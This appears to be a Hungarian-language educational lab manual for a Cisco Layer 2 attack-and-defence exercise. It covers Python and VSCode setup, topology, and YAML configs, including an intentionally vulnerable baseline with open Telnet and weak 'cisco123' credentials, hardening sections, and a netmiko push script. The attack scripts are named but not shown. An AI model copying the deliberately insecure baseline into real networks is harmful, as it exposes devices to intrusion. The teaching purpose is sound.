# SRWE Modul 10–11 — Layer 2 támadás/védelem labor

## A teljes labor egy könyvben: a környezet felállításától a 12 támadás végigjátszásáig

_Egyetlen, lépésről lépésre követhető kézikönyv. Feltételezzük, hogy még soha nem használtál Pythont. A munkakörnyezet a **Visual Studio Code (VSCode)**. Minden parancs közvetlenül másolható._

> **Biztonsági megkötés — olvasd el, mielőtt bármit futtatsz!**\
> Ez a labor **kizárólag izolált, oktatási célú hálózaton** futtatható. A támadó szkriptek **valódi** Layer 2/3 támadásokat hajtanak végre. Éles, otthoni, iskolai vagy munkahelyi hálózaton futtatni őket **tilos és jogszabályba ütközhet**. Mindig saját, elkülönített laboreszközökön (vagy emulátorban: GNS3 / EVE-NG / Cisco CML) dolgozz.

---

## Tartalomjegyzék

**I. RÉSZ — Mi ez és hogyan épül fel**

1. A labor egy percben

2. A 12 támadás és a hozzájuk tartozó védelem

3. Melyik fájl mire való

4. A három szerep és a gépeik

**II. RÉSZ — A környezet felállítása nulláról**\
5. Mi az a Python, a terminál, a venv — röviden\
6. A VSCode telepítése\
7. A Python telepítése (Windows / macOS / Linux)\
8. A projektmappa létrehozása VSCode-ban\
9. A virtuális környezet (venv) létrehozása és aktiválása\
10. A szükséges csomagok telepítése\
11. VSCode-beállítások: interpreter és terminál

**III. RÉSZ — A hálózat és a fájlok**\
12. Topológia és címzés\
13. A projekt fájlszerkezete\
14. `inventory.yml`\
15. `configs/baseline.yml`\
16. `configs/mitigations.yml`\
17. `push_config.py`\
18. `verify.py`\
19. A 12 támadó szkript (`attacker/`)

**IV. RÉSZ — A labor végigjátszása lépésről lépésre**\
20. Előkészítés: az eszközök elérhetővé tétele\
21. 0. lépés — a sebezhető baseline feltöltése\
22. 1–12. fázis — támadás → megfigyelés → védelem → újratámadás\
23. Kritikus sorrend és fázisközi figyelmeztetések

**V. RÉSZ — Lezárás**\
24. A beállítások ellenőrzése (`verify.py`)\
25. Reflexió (adatvédelmi lap)\
26. Visszaállítás a következő csoportnak\
27. Hibakeresési gyorslista\
28. Hogyan tovább — bővítés (13–16. fázis)

---

# I. RÉSZ — Mi ez és hogyan épül fel

## 1\. A labor egy percben

Egy kis Cisco-hálózaton **12 különböző Layer 2 (adatkapcsolati rétegbeli) támadást** játszol végig. Minden támadásnál ugyanaz a ritmus:

> **(1) Támadás** → **(2) Megfigyelés** (mit okozott) → **(3) Védelem feltöltése** → **(4) Újratámadás** (most már elhiúsul)

A támadásokat kész Python-szkriptek hajtják végre — **neked nem kell programoznod**, csak futtatni őket a könyvben megadott parancsokkal. A védelmeket sem kézzel gépeled be az eszközökre: egy YAML-fájlban már le vannak írva, és egyetlen parancs feltölti őket.

A labor végén egy ellenőrző szkript (`verify.py`) **ellenőrzi**, hogy minden védelem a helyén van-e. Nem ad jegyet és nem pontoz.

**A nagy tanulság:** a modern titkosítás (HTTPS, DoH, DNSSEC) sem véd, ha a switch-szintű (Layer 2) alap nincs megerősítve. Ezt a labor végén a reflexiós lap dolgozza fel.

## 2\. A 12 támadás és a hozzájuk tartozó védelem

| \# | Támadás | Mit csinál (nagyon röviden) | Védelem |
| --- | --- | --- | --- |
| 1 | MAC flood (CAM overflow) | Teleszemeteli a switch MAC-tábláját → a switch mindenkinek mindent továbbít | Port Security |
| 2 | MAC spoofing | Ellopja egy legit gép MAC-címét | Port Security (sticky) |
| 3 | DHCP starvation | Elfogyasztja az összes kiosztható IP-címet (DoS) | DHCP Snooping (+ rate limit) |
| 4 | DHCP spoofing (rogue DHCP) | Hamis DHCP-szerver → ő lesz a gateway/DNS (MITM) | DHCP Snooping (trust) |
| 5 | ARP poisoning | Hamis ARP-válaszokkal a forgalom közé ékelődik (MITM) | Dynamic ARP Inspection (DAI) |
| 6 | STP root takeover | A támadó lesz a "fő" switch → átfolyik rajta a forgalom | BPDU Guard + Root Guard |
| 7 | VLAN hopping (DTP) | Trunkká alakít egy sima portot → több VLAN-t lát | DTP tiltása, fix access portok |
| 8 | CDP recon + nyílt Telnet | Lehallgatja az eszközinfót, kihasználja a titkosítatlan Telnetet | Switch hardening (SSHv2, no CDP) |
| 9 | 802.1Q double-tagging | Dupla VLAN-címkével idegen VLAN-ba juttat keretet | Dedikált natív VLAN + pruning |
| 10 | IP spoofing | Hamis forrás-IP-vel küld csomagot | IP Source Guard |
| 11 | LLDP recon | Lehallgatja/hamisítja a szomszéd-felderítő üzeneteket | LLDP tiltása user-portokon |
| 12 | ICMP redirect (gateway MITM) | Hamis útvonalat tol az áldozatnak | `no ip redirects` a routeren |

## 3\. Melyik fájl mire való

A labor néhány fájlból áll. Ezek **már a repóban vannak** (nem kell létrehoznod őket) — a III. rész bemutatja, melyik mire való, és a teljes tartalmukat is tartalmazza referenciaként.

| Fájl | Mire való |
| --- | --- |
| `inventory.yml` | A három hálózati eszköz (S1, S2 switch, R1 router) IP-címe és bejelentkezési adatai. Minden feltöltő/ellenőrző parancs ebből dolgozik. |
| `configs/baseline.yml` | A **sebezhető kiinduló állapot**: minden védelem KI van kapcsolva, de az eszközök elérhetők (és a Telnet szándékosan nyitva, hogy a 8. fázis bemutatható legyen). |
| `configs/mitigations.yml` | A **12 védelem** leírása, szekciókra bontva. Szekciónként feltölthető. |
| `push_config.py` | Ez tölti fel a YAML-ben leírt konfigurációt az eszközökre (a `netmiko` Python-csomaggal). |
| `verify.py` | **27 ellenőrzést** futtat: megnézi, aktív-e minden védelem, és felsorolja, melyik beállítás van/nincs a helyén. Nem ad jegyet és nem pontoz. |
| `attacker/` (12 db `.py`) | A 12 támadó szkript. Mindegyiket **rendszergazdai (root) joggal** kell futtatni. |

## 4\. A három szerep és a gépeik

A laborban három "szereplő" van. Ezek lehetnek külön fizikai gépek vagy külön virtuális gépek (VM-ek):

| Szerep | Gép | Mit csinál | Mi kell rá |
| --- | --- | --- | --- |
| **Üzemeltető / admin** | PC-A | Feltölti a konfigot és ellenőriz (`push_config.py`, `verify.py`) | Python + `netmiko`, `pyyaml` |
| **Támadó** | ATTACKER | Futtatja a támadó szkripteket | Python + `scapy`, **root jog** |
| **Áldozat / megfigyelő** | PC-V (és PC-W a 9. fázishoz) | A forgalmat figyeli: **Linuxon `tcpdump`**, **Windowson Wireshark** | Linux + `tcpdump`, **vagy** Windows + Wireshark |

> **Melyik gépen dolgozol a könyv szerint?** A II. rész (környezet) elsősorban a **PC-A (admin)** és az **ATTACKER** gépre vonatkozik, mert ezeken futnak a Python-szkriptek. Mindkettőn ugyanígy állítod be a Python-környezetet; csak a telepítendő csomag más (admin: `netmiko pyyaml`, támadó: `scapy`).

---

# II. RÉSZ — A környezet felállítása nulláról

> Ezt a részt akkor is végig tudod csinálni, ha még **soha** nem használtál Pythont vagy terminált. Minden lépésnél leírjuk, mit írj be és mit kell látnod.

## 5\. Mi az a Python, a terminál, a venv — röviden

* **Python**: egy programozási nyelv. A labor szkriptjei Pythonban készültek. Ahhoz, hogy lefuttasd őket, telepítened kell a Python **értelmezőt** (a programot, ami futtatja a `.py` fájlokat).

* **Terminál (parancssor)**: egy szöveges ablak, ahova parancsokat gépelsz. A VSCode-ban van beépített terminál — ezt fogjuk használni, nem kell külön programot nyitni.

* **venv (virtuális környezet)**: egy **külön doboz** a projekted számára, amibe a Python-csomagokat (pl. `scapy`) telepíted. Így a labor csomagjai nem keverednek a géped többi Python-projektjével, és bármikor törölhető/újraépíthető. **Mindig venv-ben dolgozz** — ez a bevett gyakorlat.

> **Egy mondatban:** telepíted a Pythont → létrehozol egy venv "dobozt" → abba telepíted a csomagokat → onnan futtatod a szkripteket.

## 6\. A VSCode telepítése

1. Nyisd meg a böngésződben: **[https://code.visualstudio.com](https://code.visualstudio.com)**

2. Kattints a nagy **Download** gombra (a géped rendszerét automatikusan felismeri).

3. Telepítsd a letöltött fájlt (Windows: `.exe`, macOS: `.dmg` → húzd az Applications mappába, Linux: `.deb`/`.rpm`).

4. Indítsd el a VSCode-ot.

5. Telepítsd a **Python bővítményt**:

  * Bal oldalon kattints a **Extensions** ikonra (négy kocka), vagy nyomd: `Ctrl+Shift+X` (macOS: `Cmd+Shift+X`).

  * A keresőbe írd: `Python`.

  * A **Microsoft** által kiadott "Python" bővítménynél kattints **Install**.

## 7\. A Python telepítése

> Ellenőrizd először, hátha már fenn van. Nyisd meg a VSCode-ban a terminált: felső menü → **Terminal → New Terminal** (vagy `Ctrl+``). Majd írd be:

```bash
python3 --version
```

Ha valami ilyet ír ki — `Python 3.10.x` (bármi 3.8 felett jó) —, **ugorhatsz a 8. fejezetre**. Ha "command not found" vagy hasonló hibát kapsz, telepítsd a rendszered szerint:

### Windows

1. Böngészőben: **[https://www.python.org/downloads/](https://www.python.org/downloads/)** → **Download Python 3.x**.

2. Indítsd a telepítőt, és **nagyon fontos**: pipáld be alul az **"Add python.exe to PATH"** jelölőnégyzetet, mielőtt a telepítésre kattintasz.

3. Kattints **Install Now**, majd a végén **Close**.

4. Zárd be és nyisd újra a VSCode-ot (hogy észlelje a Pythont).

5. Ellenőrzés a terminálban (Windowson gyakran `python` a parancs, nem `python3`):

  ```bash
  python --version
  ```

### macOS

A legegyszerűbb a Homebrew nevű csomagkezelővel. A terminálban:

```bash
# 1) Homebrew telepítése (ha még nincs):
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
# 2) Python telepítése:
brew install python
# 3) Ellenőrzés:
python3 --version
```

### Linux (Ubuntu/Debian)

```bash
sudo apt update
sudo apt install -y python3 python3-pip python3-venv
python3 --version
```

> **Megjegyzés a parancsnevekről:** Windowson a Python általában `python` és `pip`, macOS/Linuxon `python3` és `pip3`. A könyv a `python3` / `pip` alakot használja — ha Windowson a `python3` nem működik, írj `python`-t helyette.

## 8\. A projektmappa létrehozása VSCode-ban

1. A VSCode-ban: **File → Open Folder…**

2. Hozz létre egy új mappát a gépeden (pl. a dokumentumok közt) **`srwe-lab`** néven, és nyisd meg.

  * _Tipp:_ ha a repóból dolgozol, egyszerűen nyisd meg a klónozott `srwe-lab-10-11` mappát — a fájlok már benne vannak.

3. Mostantól a VSCode bal oldali sávjában (**Explorer**, `Ctrl+Shift+E`) látod a mappa tartalmát, és ide hozod létre a fájlokat.

> **Új fájl létrehozása VSCode-ban:** az Explorer sávban vidd az egeret a mappanévre → kattints az **új fájl** ikonra (lap +) → írd be a fájl nevét (pl. `inventory.yml`) → Enter → a jobb oldali szerkesztőbe bemásolod a tartalmat → mentés `Ctrl+S`.

## 9\. A virtuális környezet (venv) létrehozása és aktiválása

Nyisd meg a beépített terminált (**Terminal → New Terminal**). Győződj meg róla, hogy a `srwe-lab` mappában vagy (a terminál sor elején látnod kell a mappa nevét).

**1) Hozd létre a venv-et** (ez egy `.venv` nevű "dobozt" készít a projektben):

```bash
python3 -m venv .venv
```

**2) Aktiváld a venv-et** — a rendszered szerint:

* **Windows (PowerShell, a VSCode alap terminálja):**

  ```powershell
  .venv\Scripts\Activate.ps1
  ```

  > Ha hibát ír, hogy a szkriptfuttatás tiltva van, egyszer futtasd ezt, majd próbáld újra az aktiválást:
  >
  > ```powershell
  > Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned
  > ```

* **Windows (ha Command Prompt / cmd terminált használsz):**

  ```bat
  .venv\Scripts\activate.bat
  ```

* **macOS / Linux:**

  ```bash
  source .venv/bin/activate
  ```

**Sikeres aktiválás jele:** a terminál sor elején megjelenik `(.venv)`. Innentől minden `pip install` ebbe a dobozba telepít, és minden `python3` ezt a Pythont használja.

> **Később, új terminál nyitásakor** mindig aktiváld újra a venv-et a fenti 2) paranccsal. Kilépni belőle a `deactivate` paranccsal tudsz.

## 10\. A szükséges csomagok telepítése

A `requirements.txt` **már a repóban van**, ezért nem kell létrehoznod — csak futtasd a telepítő parancsot.

**1. opció (ajánlott) — telepítés a `requirements.txt`-ből egyetlen paranccsal.** Győződj meg róla, hogy aktív a venv (látszik a `(.venv)` jel), és a projekt gyökerében vagy, majd:

```bash
python3 -m pip install --upgrade pip
pip install -r requirements.txt
```

Ez egyszerre telepíti mind a három csomagot (`netmiko`, `pyyaml`, `scapy`), így ugyanaz a parancs működik az admin és a támadó gépen is.

**2. opció — gépenként külön, kézzel** (ha nem a `requirements.txt`-et használod):

```bash
# Az admin gépen (PC-A):
pip install netmiko pyyaml
# A támadó gépen (ATTACKER):
pip install scapy
```

**Ellenőrzés, hogy a csomagok fent vannak:**

```bash
pip list
```

A listában látnod kell a `netmiko`, `PyYAML`, illetve `scapy` sorokat.

> **Fontos a támadó szkriptekről:** ezeket **root (rendszergazda) joggal** kell futtatni, mert a scapy közvetlenül a hálózati kártyához fér hozzá. Linuxon ez `sudo`-val megy. Viszont a `sudo` alapból **kilép a venv-ből**, ezért a támadó szkripteket a venv Pythonjának teljes elérési útjával indítsd — erről a IV. részben (22. fejezet) külön szólunk.

## 11\. VSCode-beállítások: interpreter és terminál

1. **Válaszd ki a venv Pythont interpreterként**, hogy a VSCode is ezt használja:

  * Nyomd: `Ctrl+Shift+P` (macOS: `Cmd+Shift+P`) → írd: **Python: Select Interpreter** → Enter.

  * A listából válaszd azt, amelyik a projekted `.venv` mappájára mutat (általában `('.venv': venv)` felirattal).

2. **Ettől kezdve** ha a VSCode-ban új terminált nyitsz, az gyakran **automatikusan aktiválja** a venv-et (látod a `(.venv)` jelet). Ha mégsem, aktiváld kézzel a 9. fejezet 2) parancsával.

3. **A szkripteket kétféleképp futtathatod:**

  * A terminálban beírt paranccsal (ezt használja a könyv végig), pl. `python3 push_config.py ...`

  * VAGY a megnyitott `.py` fájl jobb felső sarkában a ▷ (Run) gombbal — de a labor parancsai argumentumokat várnak, ezért a **terminálos futtatás az ajánlott**.

> ✅ **Ellenőrző pont a II. rész végén.** Mielőtt továbbmész, teljesülnie kell:
>
> * `python3 --version` (vagy `python --version`) kiír egy 3.8+ verziót,
>
> * a terminál elején ott a `(.venv)` jel,
>
> * a `pip list` mutatja a szükséges csomagokat.
>
> Ha mindhárom igaz, a környezet kész — jöhet a hálózat és a fájlok.

---

# III. RÉSZ — A hálózat és a fájlok

> **Minden labor-fájl már a repóban van** — ha a repóból dolgozol (klónozás vagy letöltés), **semmit sem kell kézzel létrehoznod**, a fájlok készen állnak. Ebben a részben megismered a topológiát, és végigveszed, melyik fájl mit tartalmaz. A teljes tartalom itt is megvan referenciaként (és ha mégis nulláról építenéd fel kézzel, bemásolhatod a VSCode-ban — lásd a 8. fejezet "Új fájl létrehozása" tippjét).

## 12\. Topológia és címzés

```
                         ┌─────────────┐
                         │   R1        │  DHCP szerver (VLAN 10), GW
                         │  Gi0/1      │  + subinterface-ek (.10, .20, .99)
                         └──────┬──────┘
                                │ trunk
        ┌───────────────────────┴─────────────────────┐
        │                    S1                       │
        │  Fa0/1: PC-V (áldozat, VLAN 10)             │
        │  Fa0/2: PC-A (admin, VLAN 99, netmiko)      │
        │  Fa0/3: ATTACKER (támadó, VLAN 10)          │
        │  Fa0/24: → S2 Fa0/24 (trunk, VLAN 10,20,99) │
        └───────────────────────┬─────────────────────┘
                                │
                         ┌──────┴──────┐
                         │     S2      │
                         │ Fa0/1: PC-W │  (VLAN 20 — double-tagging cél)
                         └─────────────┘

Management VLAN 99:  S1 = 10.0.99.1, S2 = 10.0.99.2, R1 = 10.0.99.254, PC-A = 10.0.99.10
User VLAN 10:        10.10.10.0/24  (PC-V, ATTACKER, DHCP pool az R1-en)
Test VLAN 20:        10.20.20.0/24  (PC-W — csak a 9. fázishoz kell)
```

**Gépkövetelmények (emlékeztető):**

* **PC-A (admin):** `python3`, `pip install netmiko pyyaml`

* **ATTACKER (támadó):** `python3`, `pip install scapy`, root jog (raw socket)

* **PC-V / PC-W (áldozat / megfigyelő):** lehet **Linux** (`tcpdump` telepítve) **vagy Windows** (telepített **Wireshark**-kal) — a forgalomfigyeléshez bármelyik jó. A megfigyelő parancsok/lépések mindkét rendszerre megtalálhatók a IV. részben.

> **Emulációban is megy:** GNS3 / EVE-NG / Cisco CML a switchekhez és R1-hez, a PC-khez Linux vagy Windows VM-ek. A scapy Layer 2-támadásaihoz a virtuális switch portoknak **promiscuous / trunk-áteresztő** módban kell lenniük, különben a keretek nem jutnak át.

## 13\. A projekt fájlszerkezete

A repó ezt a szerkezetet tartalmazza (a `.venv`-et a II. részben te hozod létre, minden más **már a repóban van**):

```
srwe-lab/
├── .venv/                      # a virtuális környezet (II. rész)
├── requirements.txt            # a csomaglista (II. rész)
├── inventory.yml               # 14. fejezet
├── configs/
│   ├── baseline.yml            # 15. fejezet
│   └── mitigations.yml         # 16. fejezet
├── push_config.py              # 17. fejezet
├── verify.py                   # 18. fejezet (már a repóban van)
└── attacker/                   # 19. fejezet — 12 támadó szkript
    ├── mac_flood.py            # 1
    ├── mac_spoof.py            # 2
    ├── dhcp_starve.py          # 3
    ├── rogue_dhcp.py           # 4
    ├── arp_spoof.py            # 5
    ├── stp_takeover.py         # 6
    ├── vlan_hop_recon.py       # 7
    ├── cdp_telnet_recon.py     # 8
    ├── vlan_double_tag.py      # 9
    ├── ip_spoof.py             # 10
    ├── lldp_recon.py           # 11
    └── icmp_redirect.py        # 12
```

> **Megjegyzés:** a `configs/` és az `attacker/` mappa a bennük lévő fájlokkal együtt **már a repóban van**. Csak akkor kell kézzel létrehoznod őket (Explorer sáv → **új mappa** ikon), ha nulláról, repó nélkül építed fel a projektet.

## 14\. `inventory.yml`

A három eszköz elérési adatai. A fájl **már a repóban van** — csak **írd át** az IP-címeket és jelszavakat a saját eszközeidhez!

```yaml
devices:
  S1:
    device_type: cisco_ios
    host: 10.0.99.1
    username: admin
    password: cisco123
    secret: cisco123
  S2:
    device_type: cisco_ios
    host: 10.0.99.2
    username: admin
    password: cisco123
    secret: cisco123
  R1:
    device_type: cisco_ios
    host: 10.0.99.254
    username: admin
    password: cisco123
    secret: cisco123

management_vlan: 99
user_vlan: 10
test_vlan: 20
user_subnet: 10.10.10.0/24
legit_gateway: 10.10.10.1
legit_dhcp: 10.10.10.1
```

## 15\. `configs/baseline.yml` — kiinduló, sebezhető állapot

**Kettős cél:** (a) minden védelem KI van kapcsolva, hogy a támadások láthatók legyenek; (b) az eszközök elérhetők, és a vty-sorokon **Telnet is nyitva** van, hogy a 8. fázis (CDP + Telnet-próba) demonstrálható legyen.

**Fontos formázási szabály:** mivel a feltöltő (`push_config.py`) nem szúr be automatikus `exit`-et, a konténerparancsok (`vlan`, `interface`, `line`) blokkjait **explicit `exit` sor zárja**.

```yaml
S1:
  global:
    - hostname S1
    - vlan 10
    - exit
    - vlan 20
    - exit
    - vlan 99
    - exit
    - interface vlan 99
    - ip address 10.0.99.1 255.255.255.0
    - no shutdown
    - exit
    - ip default-gateway 10.0.99.254
    - ip domain-name lab.local
    - crypto key generate rsa modulus 1024
    - username admin privilege 15 secret cisco123
    - line vty 0 4
    - transport input telnet ssh
    - password ciscotelnet
    - login
    - exec-timeout 5 0
    - exit
    - ip http server
    # NINCS: port-security, snooping, DAI, guard-ok, IPSG, LLDP-tiltás,
    #        no cdp run, no ip redirects — ezek hiánya a sebezhetőség
  interfaces:
    FastEthernet0/1:
      - switchport mode access
      - switchport access vlan 10
      - spanning-tree portfast
    FastEthernet0/2:
      - switchport mode access
      - switchport access vlan 99
    FastEthernet0/3:
      - switchport mode access
      - switchport access vlan 10
      - spanning-tree portfast
    FastEthernet0/24:
      - switchport mode trunk
      - switchport trunk allowed vlan 10,20,99

S2:
  global:
    - hostname S2
    - vlan 10
    - exit
    - vlan 20
    - exit
    - vlan 99
    - exit
    - interface vlan 99
    - ip address 10.0.99.2 255.255.255.0
    - no shutdown
    - exit
    - ip default-gateway 10.0.99.254
    - ip domain-name lab.local
    - crypto key generate rsa modulus 1024
    - username admin privilege 15 secret cisco123
    - line vty 0 4
    - transport input telnet ssh
    - password ciscotelnet
    - login
    - exec-timeout 5 0
    - exit
  interfaces:
    FastEthernet0/1:
      - switchport mode access
      - switchport access vlan 20
    FastEthernet0/24:
      - switchport mode trunk
      - switchport trunk allowed vlan 10,20,99

R1:
  global:
    - hostname R1
    - interface GigabitEthernet0/0
    - ip address 10.0.99.254 255.255.255.0
    - no shutdown
    - exit
    - interface GigabitEthernet0/1
    - no shutdown
    - exit
    - interface GigabitEthernet0/1.10
    - encapsulation dot1Q 10
    - ip address 10.10.10.1 255.255.255.0
    - exit
    - interface GigabitEthernet0/1.20
    - encapsulation dot1Q 20
    - ip address 10.20.20.1 255.255.255.0
    - exit
    - interface GigabitEthernet0/1.99
    - encapsulation dot1Q 99
    - ip address 10.0.99.253 255.255.255.0
    - exit
    # NINCS 'no ip redirects' — az ICMP-redirect támadás (12. fázis) miatt
  dhcp_pool:
    - ip dhcp excluded-address 10.10.10.1 10.10.10.10
    - ip dhcp pool USERS
    - network 10.10.10.0 255.255.255.0
    - default-router 10.10.10.1
    - dns-server 10.10.10.1
    - exit
```

## 16\. `configs/mitigations.yml` — védelmek szekciónként

Használat: `python3 push_config.py inventory.yml configs/mitigations.yml <szekció>`\
A szekciók **sorrendje számít** — lásd a 23. fejezet függőségi megjegyzéseit.

```yaml
# ------------------------------------------------------------------
# 1-2. MAC flooding + MAC spoofing -> PORT SECURITY
# ------------------------------------------------------------------
port-security:
  S1:
    interfaces:
      FastEthernet0/1:
        - switchport port-security
        - switchport port-security maximum 2
        - switchport port-security mac-address sticky
        - switchport port-security violation restrict
      FastEthernet0/3:                              # ATTACKER portja
        - switchport port-security
        - switchport port-security maximum 1
        - switchport port-security violation shutdown
    post:
      - show port-security interface fa0/1
      - show port-security interface fa0/3
  S2:
    interfaces:
      FastEthernet0/1:
        - switchport port-security
        - switchport port-security maximum 2
        - switchport port-security mac-address sticky
        - switchport port-security violation restrict

# ------------------------------------------------------------------
# 3-4. DHCP starvation + spoofing -> DHCP SNOOPING
# ------------------------------------------------------------------
dhcp-snooping:
  S1:
    global:
      - ip dhcp snooping
      - ip dhcp snooping vlan 10
      - no ip dhcp snooping information option   # router-on-a-stick kompatibilitás
    interfaces:
      GigabitEthernet0/1:                         # DHCP szerver (R1) felé — TRUSTED
        - ip dhcp snooping trust
      FastEthernet0/24:                           # S2 felé — TRUSTED
        - ip dhcp snooping trust
      FastEthernet0/3:                            # ATTACKER — untrusted + rate limit
        - ip dhcp snooping limit rate 5
    post:
      - show ip dhcp snooping
      - show ip dhcp snooping binding
  S2:
    global:
      - ip dhcp snooping
      - ip dhcp snooping vlan 10
      - no ip dhcp snooping information option
    interfaces:
      FastEthernet0/24:
        - ip dhcp snooping trust
    post:
      - show ip dhcp snooping

# ------------------------------------------------------------------
# 5. ARP poisoning -> DYNAMIC ARP INSPECTION
# ------------------------------------------------------------------
dai:
  S1:
    global:
      - ip arp inspection vlan 10
    interfaces:
      FastEthernet0/24:                           # trunk S2 felé — trust
        - ip arp inspection trust
      FastEthernet0/1:
        - ip arp inspection limit rate 15
      FastEthernet0/3:
        - ip arp inspection limit rate 15
    post:
      - show ip arp inspection
      - show ip arp inspection statistics vlan 10
  S2:
    global:
      - ip arp inspection vlan 10
    interfaces:
      FastEthernet0/24:
        - ip arp inspection trust
    post:
      - show ip arp inspection

# ------------------------------------------------------------------
# 6. STP manipuláció -> BPDU GUARD + ROOT GUARD
# ------------------------------------------------------------------
stp-guard:
  S1:
    global:
      - spanning-tree vlan 10 root primary
    interfaces:
      FastEthernet0/1:
        - spanning-tree bpduguard enable
      FastEthernet0/3:
        - spanning-tree bpduguard enable
        - spanning-tree guard root
    post:
      - show spanning-tree summary
      - show spanning-tree inconsistentports
  S2:
    global:
      - spanning-tree vlan 10 root secondary
    interfaces:
      FastEthernet0/1:
        - spanning-tree bpduguard enable

# ------------------------------------------------------------------
# 7. VLAN hopping (DTP) -> DTP TILTÁSA + nem használt portok lezárása
# ------------------------------------------------------------------
vlan-hop:
  S1:
    global:
      - no cdp run
    interfaces:
      FastEthernet0/1:
        - switchport nonegotiate
        - switchport mode access
        - switchport access vlan 10
      FastEthernet0/3:
        - switchport nonegotiate
        - switchport mode access
        - switchport access vlan 10
      FastEthernet0/24:
        - switchport nonegotiate
      range Fa0/4 - 23:
        - shutdown
        - switchport mode access
        - switchport access vlan 999
  S2:
    global:
      - no cdp run
    interfaces:
      FastEthernet0/1:
        - switchport nonegotiate
        - switchport mode access
      range Fa0/2 - 23:
        - shutdown
        - switchport access vlan 999

# ------------------------------------------------------------------
# 8. CDP felderítés + Telnet -> SWITCH HARDENING
# ------------------------------------------------------------------
hardening:
  S1:
    global:
      - no cdp run
      - no ip http server
      - service password-encryption
      - enable secret cisco123
      - ip ssh version 2
      - line console 0
      - password conpass
      - login
      - exit
      - line vty 0 4
      - transport input ssh
      - login local
      - exec-timeout 5 0
      - exit
    post:
      - show cdp
      - show ip ssh
  S2:
    global:
      - no cdp run
      - ip ssh version 2
      - line vty 0 4
      - transport input ssh
      - login local
      - exit

# ------------------------------------------------------------------
# 9. Double-tagging -> NATIV VLAN HARDENING + PRUNING
# ------------------------------------------------------------------
native-vlan-hardening:
  S1:
    global:
      - vlan 999
      - name NATIVE_BLACKHOLE
      - exit
    interfaces:
      FastEthernet0/24:
        - switchport mode trunk
        - switchport trunk native vlan 999
        - switchport trunk allowed vlan 10,20,99
    post:
      - show interfaces trunk
  S2:
    interfaces:
      FastEthernet0/24:
        - switchport mode trunk
        - switchport trunk native vlan 999
        - switchport trunk allowed vlan 10,20,99
    post:
      - show interfaces trunk

# ------------------------------------------------------------------
# 10. IP spoofing -> IP SOURCE GUARD (kötelezően a dhcp-snooping UTÁN!)
# ------------------------------------------------------------------
ip-source-guard:
  S1:
    interfaces:
      FastEthernet0/1:
        - ip verify source
      FastEthernet0/3:
        - ip verify source
        - switchport port-security
        - switchport port-security maximum 1
    post:
      - show ip verify source
      - show ip source binding
  S2:
    interfaces:
      FastEthernet0/1:
        - ip verify source
    post:
      - show ip verify source

# ------------------------------------------------------------------
# 11. LLDP felderítés -> LLDP TILTÁSA USER-PORTOKON
# Megjegyzés: platformfüggő — egyes IOS-buildeken csak globális
# 'no lldp run' létezik. Első alkalommal teszteld a saját IOS-odon!
# ------------------------------------------------------------------
lldp-hardening:
  S1:
    interfaces:
      FastEthernet0/1:
        - no lldp transmit
        - no lldp receive
      FastEthernet0/3:
        - no lldp transmit
        - no lldp receive
    post:
      - show lldp interface FastEthernet0/1
      - show lldp neighbors
  S2:
    interfaces:
      FastEthernet0/1:
        - no lldp transmit
        - no lldp receive
    post:
      - show lldp interface FastEthernet0/1

# ------------------------------------------------------------------
# 12. ICMP-redirect MITM -> REDIRECT TILTÁSA A ROUTEREN
# ------------------------------------------------------------------
icmp-redirect:
  R1:
    interfaces:
      GigabitEthernet0/1.10:
        - no ip redirects
      GigabitEthernet0/1.20:
        - no ip redirects
      GigabitEthernet0/1.99:
        - no ip redirects
    post:
      - show ip interface GigabitEthernet0/1.10 | include redirects
```

## 17\. `push_config.py` — YAML-ból Cisco-ra töltő (netmiko)

Ez a szkript olvassa be az `inventory.yml`-t és a kiválasztott konfigurációs YAML-t, majd SSH-n feltölti az eszközökre. **Már a repóban van, és nem kell módosítanod** — csak futtatod. (A tartalma referenciaként itt is megvan.)

```python
#!/usr/bin/env python3
"""YAML-ban definiált konfiguráció feltöltése Cisco eszközökre.

Használat:
    python3 push_config.py inventory.yml configs/baseline.yml
    python3 push_config.py inventory.yml configs/mitigations.yml port-security
    python3 push_config.py inventory.yml configs/mitigations.yml   # minden szekció

Megjegyzés: a pusher NEM szúr be automatikus 'exit'-et a konténerparancsok
után — a YAML-ban azok explicit módon szerepelnek.
"""
import sys
import yaml
from netmiko import ConnectHandler
from netmiko.exceptions import NetmikoAuthenticationException, NetmikoTimeoutException


def parse_interface_key(key: str):
    """'range Fa0/4 - 23' -> ('interface range', 'Fa0/4 - 23')"""
    if key.startswith("range "):
        return "interface range", key[len("range "):].strip()
    return "interface", key


def push_device(inventory: dict, device_name: str, device_cfg: dict, save: bool = True):
    params = dict(inventory["devices"][device_name])
    print(f"\n=== {device_name} ({params['host']}) ===")
    try:
        conn = ConnectHandler(**params)
    except (NetmikoTimeoutException, NetmikoAuthenticationException) as e:
        print(f"[HIBA] {device_name}: {e}")
        return False

    ok = True
    try:
        # Globális / dhcp_pool parancslisták
        for section in ("global", "dhcp_pool"):
            cmds = device_cfg.get(section, [])
            if cmds:
                conn.send_config_set(list(cmds))
                print(f"[OK] {device_name}: {section} ({len(cmds)} sor)")

        # Interfész-szekciók
        for if_key, if_cmds in device_cfg.get("interfaces", {}).items():
            enter, target = parse_interface_key(if_key)
            conn.send_config_set([f"{enter} {target}"] + list(if_cmds))
            print(f"[OK] {device_name}: {enter} {target} ({len(if_cmds)} sor)")

        # Ellenőrző show parancsok
        for cmd in device_cfg.get("post", []):
            out = conn.send_command(cmd)
            print(f"--- {cmd} ---\n{out}\n")

        if save:
            conn.save_config()
            print(f"[OK] {device_name}: write memory")
    except Exception as e:
        print(f"[HIBA] {device_name}: {e}")
        ok = False
    finally:
        conn.disconnect()
    return ok


def main():
    if len(sys.argv) < 3:
        print(__doc__)
        sys.exit(1)

    inv_path, cfg_path = sys.argv[1], sys.argv[2]
    section_filter = sys.argv[3] if len(sys.argv) > 3 else None

    with open(inv_path) as f:
        inventory = yaml.safe_load(f)
    with open(cfg_path) as f:
        config = yaml.safe_load(f)

    failures = []
    for section_name, section_cfg in config.items():
        if section_filter and section_name != section_filter:
            continue
        if section_filter is None:
            print(f"\n########## SZEKCIÓ: {section_name} ##########")
        for device_name, device_cfg in section_cfg.items():
            if not push_device(inventory, device_name, device_cfg):
                failures.append(f"{section_name}/{device_name}")

    if failures:
        print(f"\nSIKERTELEN: {', '.join(failures)}")
        sys.exit(2)
    print("\nKész.")


if __name__ == "__main__":
    main()
```

